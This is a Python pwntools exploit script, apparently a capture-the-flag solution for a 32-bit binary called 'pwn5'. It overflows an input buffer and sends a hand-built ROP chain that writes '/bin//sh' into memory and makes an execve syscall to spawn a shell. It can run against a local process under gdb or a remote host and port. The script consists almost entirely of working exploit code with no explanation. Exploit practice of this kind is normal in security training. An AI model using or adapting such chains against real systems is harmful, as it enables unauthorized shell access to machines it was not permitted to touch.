#!/usr/bin/env python
from pwn import *
import sys
import time

context.terminal = ['tmux','splitw','-h']

def exploit(r):
    first_name = 0x80f1a20
    popret = 0x80481d1
    pop3ret = 0x80483e8
    pop2ret = 0x80483e9
    pop4ret = 0x80483e7
    open = 0x8048420
    #r.recvuntil("yourself")
    #r.recvuntil("What is your first name?:")
    r.sendline("flag.txt") #firstname
    r.sendline("flag.txt") #lastname
    r.sendline("B")
    r.sendline("y")
    r.sendline("2")
    r.send("A"*32)
    p = ''

    p += p32(0x0807338a) # pop edx ; ret
    p += p32(0x080f0060) # @ .data
    p += p32(0x080bc396) # pop eax ; ret
    p += '/bin'
    p += p32(0x0805512b) # mov dword ptr [edx], eax ; ret
    p += p32(0x0807338a) # pop edx ; ret
    p += p32(0x080f0064) # @ .data + 4
    p += p32(0x080bc396) # pop eax ; ret
    p += '//sh'
    p += p32(0x0805512b) # mov dword ptr [edx], eax ; ret
    p += p32(0x0807338a) # pop edx ; ret
    p += p32(0x080f0068) # @ .data + 8
    p += p32(0x080496b3) # xor eax, eax ; ret
    p += p32(0x0805512b) # mov dword ptr [edx], eax ; ret
    p += p32(0x080481d1) # pop ebx ; ret
    p += p32(0x080f0060) # @ .data
    p += p32(0x080e4325) # pop ecx ; ret
    p += p32(0x080f0068) # @ .data + 8
    p += p32(0x0807338a) # pop edx ; ret
    p += p32(0x080f0068) # @ .data + 8
    p += p32(0x080496b3) # xor eax, eax ; ret
    p += p32(0x0807ebcf) # inc eax ; ret
    p += p32(0x0807ebcf) # inc eax ; ret
    p += p32(0x0807ebcf) # inc eax ; ret
    p += p32(0x0807ebcf) # inc eax ; ret
    p += p32(0x0807ebcf) # inc eax ; ret
    p += p32(0x0807ebcf) # inc eax ; ret
    p += p32(0x0807ebcf) # inc eax ; ret
    p += p32(0x0807ebcf) # inc eax ; ret
    p += p32(0x0807ebcf) # inc eax ; ret
    p += p32(0x0807ebcf) # inc eax ; ret
    p += p32(0x0807ebcf) # inc eax ; ret
    p += p32(0x08071005) # int 0x80
    r.sendline(p)


    r.interactive()
    return





if __name__ == "__main__":
    log.info("For remote %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        pause()
        exploit(r)
    else:
        r = process('./pwn5')     #put binary here
        print util.proc.pidof(r)
        gdb_cmd = [
            "b *0x80488e3",
            "c"


        ]
        gdb.attach(r, gdbscript = "\n".join(gdb_cmd))
        #r = process("./LOLgame", env={"LD_PRELOAD" : "./libc.so.6.remote"})
        #pause()
        exploit(r)










